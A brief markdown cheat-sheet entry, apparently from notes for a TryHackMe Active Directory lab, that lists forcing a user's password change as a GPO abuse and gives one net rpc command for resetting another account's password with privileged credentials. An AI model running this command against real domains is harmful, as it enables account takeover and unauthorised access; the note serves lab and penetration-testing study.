## Force_Change_Password 
- One of the GPO abuse
```
net rpc password "$username_of_forced" "$desired_password" -u "thm.corp"/"$privileged_username"%"$password" -S "$IP"           
```
